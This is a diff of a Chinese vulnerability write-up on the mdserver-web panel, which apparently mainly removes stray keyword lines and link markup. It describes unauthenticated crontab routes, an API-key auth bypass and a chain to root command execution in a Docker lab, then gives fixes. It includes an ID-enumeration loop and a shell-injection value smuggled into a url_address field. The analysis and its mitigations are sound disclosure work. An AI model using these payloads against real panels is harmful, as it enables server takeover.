@@ -17,10 +17,8 @@ asset_dir: embedded-base64
 在 commit **`33cabc8e2`（2026-04-15 17:33）** 之前的版本中，存在以下四类安全[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")：
 
 1. **多处[未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83 "标签：未授权")访问（Unauthenticated Access）**：`web/admin/crontab/__init__.py` 中 **8 个路由**在注册时漏写了 `@panel_login_required` 装饰器，任何未登录用户均可直接调用这些接口；`web/admin/site/site_default.py` 中 **1 个路由** 同样缺少认证装饰器。
-
-   计算机服务器
 2. **信息泄露（Information Disclosure）**：[未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83 "标签：未授权")的 `/site/get_site_doc` 接口会将服务器上 OpenResty/Nginx 配置文件的绝对路径直接返回给攻击者；`/crontab/get_crond_find` 和 `/crontab/get_data_list` 同样无认证，可枚举任务详情及服务器上托管的网站/数据库列表。
-3. **无认证 Shell 注入 → [rce](https://mrxn.net/tag/rce "标签：rce")**：`/crontab/modify_crond`（无认证）可将任意 Shell 注入计划任务[脚本](#)，`/crontab/start_task`（无认证）可立即触发执行，全程不需要登录凭据。组合利用只需先用 `/crontab/get_crond_find` 枚举到一个有效任务 ID，即可在服务器上[执行任意命令](https://mrxn.net/tag/rce "标签：执行任意命令")。
+3. **无认证 Shell 注入 → [rce](https://mrxn.net/tag/rce "标签：rce")**：`/crontab/modify_crond`（无认证）可将任意 Shell 注入计划任务脚本，`/crontab/start_task`（无认证）可立即触发执行，全程不需要登录凭据。组合利用只需先用 `/crontab/get_crond_find` 枚举到一个有效任务 ID，即可在服务器上[执行任意命令](https://mrxn.net/tag/rce "标签：执行任意命令")。
 4. **认证中间件缺陷（Auth Middleware Bypass）**：`panel_login_required` 存在危险默认值（`open:True`）、IP 白名单从未校验、空指针异常等逻辑缺陷；持有合法 `App-Id`/`App-Secret` 的攻击者可完全绕过 Session 认证，访问所有受 `@panel_login_required` 保护的接口，再结合 Shell 注入实现 [rce](https://mrxn.net/tag/rce "标签：rce")。
 
 上述[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")链式组合：**在未获得任何认证凭据的情况下，攻击者即可通过 3 步无认证请求（枚举ID → 注入Shell → 触发执行）实现服务器[任意命令执行](https://mrxn.net/tag/rce "标签：任意命令执行")。**
@@ -33,8 +31,6 @@ asset_dir: embedded-base64
 
 **（1）关注项目 PR 合并与 commit 差异**
 
-网络安全
-
 通过审查 GitHub 仓库的 Pull Request 合并记录，发现 **PR #884**（commit `f5fda8b71`，2026-04-15 19:33）在合并前包含两个预备提交：
 
 - `c508c71f6`（2026-04-15 19:28）：`Update __init__.py` —— 修改 `web/admin/crontab/__init__.py`
@@ -42,17 +38,7 @@ asset_dir: embedded-base64
 
 这两个提交描述极为简短，但修改内容均涉及认证装饰器的添加，属于**安全补丁的典型特征**，引发重点关注。
 
-深入探索
-
-网络
-
-软件实用程序
-
-搜索引擎优化与营销
-
 **（2）逐行对比 commit diff，确认漏洞位置**
-
-脚本语言
 
 对比 `c508c71f6` 的 diff（见下方），发现该提交向 `web/admin/crontab/__init__.py` 中的 **8 个已有路由函数** 统一补加了 `@panel_login_required`——这意味着这 8 个路由在此之前**完全无需登录即可访问**。同理，`8586dbbe8` 的 diff 显示 `get_site_doc` 路由也补加了该装饰器。
 
@@ -136,7 +122,7 @@ def add(): ...
 | `/crontab/del_logs` | POST | 删除任务日志 | 清除痕迹 |
 | `/crontab/set_cron_status` | POST | 启用/禁用任务 | 可禁用安全监控、备份等关键任务 |
 | `/crontab/get_data_list` | POST | 获取网站/数据库列表 | **信息泄露**：暴露服务器托管资源 |
-| `/crontab/get_crond_find` | POST | 获取单条任务详情 | **信息泄露**：任务[脚本](#)内容 |
+| `/crontab/get_crond_find` | POST | 获取单条任务详情 | **信息泄露**：任务脚本内容 |
 | `/crontab/modify_crond` | POST | 修改计划任务 | **高危**：篡改任务脚本，结合 Shell 注入 → RCE |
 | `/crontab/start_task` | POST | 立即触发任务执行 | **高危**：结合篡改接口，立即 RCE |
 
@@ -255,8 +241,6 @@ def panel_login_required(func):
 
 理解 RCE 链路，必须先追踪 `POST /crontab/modify_crond` → `POST /crontab/start_task` 的完整内部执行路径。
 
-数据管理
-
 ```
 POST /crontab/modify_crond
   └─ MwCrontab.instance().modifyCrond(cron_id, request_data)
@@ -315,8 +299,6 @@ def getCrond(id):
 
 因此：**`cron_id` 必须是数据库中真实存在的记录 ID，否则请求直接以 500 报错结束，Shell 注入无法触发。**
 
-Linux 与 Unix
-
 #### 5.3 任务 ID 的特征与枚举策略
 
 | 特征 | 说明 |
@@ -326,7 +308,7 @@ Linux 与 Unix
 | 枚举接口 | `POST /crontab/get_crond_find`（**无认证**），传 `id=N` |
 | 存在判断 | 返回包含 `"name"` 字段的 JSON → 有效；返回 `null` / 空 → 不存在 |
 
-**无认证枚举[脚本](#)**（利用另一个未授权接口）：
+**无认证枚举脚本**（利用另一个未授权接口）：
 
 ```
 # get_crond_find 无需任何认证，可直接枚举所有任务 ID
@@ -340,8 +322,6 @@ done
 ```
 
 典型返回值（任务存在）：
-
-计算机安全
 
 ```
 {
@@ -365,8 +345,6 @@ done
 
 `modifyCrond` 调用 `cronCheck(data)` 进行参数校验：
 
-计算机服务器
-
 ```
 # web/utils/crontab.py: cronCheck()
 def cronCheck(self, params):
@@ -389,8 +367,6 @@ def cronCheck(self, params):
 ```
 
 **最小可用参数组合**（利用 `type=minute-n` 绕开 `hour`/`minute` 的必填校验）：
-
-软件
 
 | 参数 | 值 | 说明 |
 | --- | --- | --- |
@@ -432,8 +408,6 @@ url_address = '; id > /tmp/pwned.txt; echo '
 ```
 
 拼接后生成的 Shell 脚本片段：
-
-网络安全
 
 ```
 curl -sS --connect-timeout 10 -m 60 ''; id > /tmp/pwned.txt; echo ''
@@ -510,7 +484,7 @@ curl -sS --connect-timeout 10 -m 60 ''; id > /tmp/pwned.txt; echo ''
 | **ID 枚举方式** | `get_crond_find`（无认证），从 ID=1 递增；ID 为 SQLite AUTOINCREMENT，通常从 1 开始连续 |
 | **任务名称** | `name` 字段必须非空（`len(data['name']) < 1` 会被拒绝），其余内容无限制 |
 | **类型参数** | `type=minute-n` + `where1=1` 是通过 `cronCheck` 验证所需参数最少的组合 |
-| **stype** | 必须是 `toUrl`（或含注入的 `sbody` 用于自定义[脚本](#)分支），才能触发 `curl` 拼接注入 |
+| **stype** | 必须是 `toUrl`（或含注入的 `sbody` 用于自定义脚本分支），才能触发 `curl` 拼接注入 |
 | **任务状态** | 任务 `status=0`（已禁用）时 `syncToCrond` 会跳过 cron 注册但仍写入脚本文件，`startTask` 仍可执行 |
 | **并发安全** | 多个请求可同时修改并触发，无锁保护 |
 
@@ -519,8 +493,6 @@ curl -sS --connect-timeout 10 -m 60 ''; id > /tmp/pwned.txt; echo ''
 ### 七、漏洞五：API Key 认证绕过 + Shell 注入 RCE（面板 API 开启场景）
 
 > **适用范围**：此漏洞独立于 §二-§六 的无认证路由漏洞，适用于**所有版本（含 PR #884 修复后）**；只要攻击者获得了有效的 `App-Id`/`App-Secret`，即可绕过 `@panel_login_required` 装饰器，访问包括 `/crontab/add` 在内的所有受保护接口，并结合 Shell 注入实现 RCE。
->
-> 脚本语言
 
 #### 7.1 认证中间件代码分析
 
@@ -570,8 +542,6 @@ def panel_login_required(func):
 ```
 
 > **两者可叠加**：在 `≤33cabc8e2` 的版本中，攻击者既可直接无认证访问未保护路由，也可用 API Key 访问受保护路由（如 `/crontab/add`）；在修复了路由认证的版本中，仅 API Key 路径仍有效。
->
-> 编程
 
 #### 7.4 API Key 绕过 + Shell 注入攻击链
 
@@ -608,8 +578,6 @@ def panel_login_required(func):
 
 面板 UI 添加 API 应用时强制要求填写 IP 白名单，底层存储也有 `white_list` 字段，但 `panel_login_required` 从未读取它：
 
-数据管理
-
 ```
 # web/admin/setting/app.py（UI 层校验）
 limit_addr = request.form.get('limit_addr', '').strip()
@@ -632,8 +600,6 @@ return func(*args, **kwargs)  # 直接放行，无 IP 检查
 > **优化说明**：官方 `docker/Dockerfile` 会编译安装 PHP 74、OpenResty、MySQL 5.6、phpMyAdmin，耗时约 30-60 分钟。本复现环境仅启动 Flask Web 面板（SQLite 数据库），**无需任何编译，构建时间约 2-5 分钟**。
 >
 > **漏洞版本锁定**：本环境基于 commit **`33cabc8e2`（2026-04-15 17:33）**，即 PR #883 合并后、PR #884 合并前的状态，包含所有未修复的漏洞。
->
-> 计算机安全
 
 ### 前置条件
 
@@ -673,8 +639,6 @@ bash docker/vuln/start.sh
 ```
 
 启动成功后终端输出示例：
-
-软件
 
 ```
 ================================================================
@@ -729,8 +693,6 @@ docker exec mdserver-web-vuln grep -c "@panel_login_required" \
 ## 漏洞复现
 
 > 以下 PoC **全程无需登录**，直接利用未授权路由完成攻击链。
->
-> 编程
 
 ### PoC 一：信息泄露（`/crontab/get_data_list` 未授权）
 
@@ -761,8 +723,6 @@ done
 
 预期输出：
 
-数据管理
-
 ```
 stype=1: /www/server/openresty/nginx/html/index.html
 stype=2: /www/server/openresty/nginx/html/404.html
@@ -779,8 +739,6 @@ stype=4: /www/server/web_conf/stop/index.html
 `modify_crond` 内部调用 `getCrond(id)` 查询数据库，若 ID 不存在返回 `None`，紧接着访问 `info['echo']` 会触发 `TypeError`（HTTP 500）。因此：
 
 > **攻击的第一步是通过 `get_crond_find`（同样无认证）枚举出数据库中已有的任务 ID，然后才能进行注入。**
->
-> 计算机安全
 
 如果目标面板从未创建过任何计划任务，可在复现环境中先预置一条（见下文），真实场景中一般都有默认任务。
 
@@ -822,8 +780,6 @@ EOF
 
 `get_crond_find` 接口无认证保护，直接暴露数据库查询结果：
 
-网络安全
-
 ```
 TARGET="http://127.0.0.1:7200"
 
@@ -858,8 +814,6 @@ fi
 
 **`get_crond_find` 响应样例**（任务存在时）：
 
-计算机服务器
-
 ```
 {
   "id": 1,
@@ -882,9 +836,7 @@ fi
 }
 ```
 
-> `echo` 字段是磁盘上 Shell [脚本](#)的文件名（双重 MD5 hash），`modify_crond` 内部需要它来移除旧的 cron 行。
->
-> 数据管理
+> `echo` 字段是磁盘上 Shell 脚本的文件名（双重 MD5 hash），`modify_crond` 内部需要它来移除旧的 cron 行。
 
 ---
 
@@ -976,8 +928,6 @@ docker exec mdserver-web-vuln cat /tmp/pwned.txt
 ```
 
 预期输出：
-
-计算机安全
 
 ```
 uid=0(root) gid=0(root) groups=0(root)
@@ -1176,11 +1126,9 @@ curl -s -X POST http://127.0.0.1:7200/crontab/list \
 
 ---
 
-### 自动化漏洞测试[脚本](#)（Python）
+### 自动化漏洞测试脚本（Python）
 
 除上述手动 PoC 外，本环境还提供了一个综合 Python 测试脚本 `poc_test.py`，覆盖全部 9 个未授权路由漏洞、API Key 认证绕过漏洞以及完整 RCE 利用链：
-
-脚本语言
 
 ```
 # 安装依赖
@@ -1236,8 +1184,6 @@ python3 docker/vuln/poc_test.py --target http://192.168.1.100:7200 \
 ### 修复一：补全计划任务模块认证（`web/admin/crontab/__init__.py`）
 
 **来自 commit `c508c71f6`（官方实际修复）**，向所有缺少认证的路由补加装饰器：
-
-Linux 与 Unix
 
 ```
 # 以下 8 个路由均需补加 @panel_login_required
@@ -1359,8 +1305,6 @@ if stype == 'toUrl':
 在官方全量补丁发布前，**管理员可采取以下措施降低风险**：
 
 1. **防火墙层面隔离**（最有效）：仅允许可信 IP 访问面板端口：
-
-   计算机安全
 
    ```
    # 仅允许特定 IP 访问面板
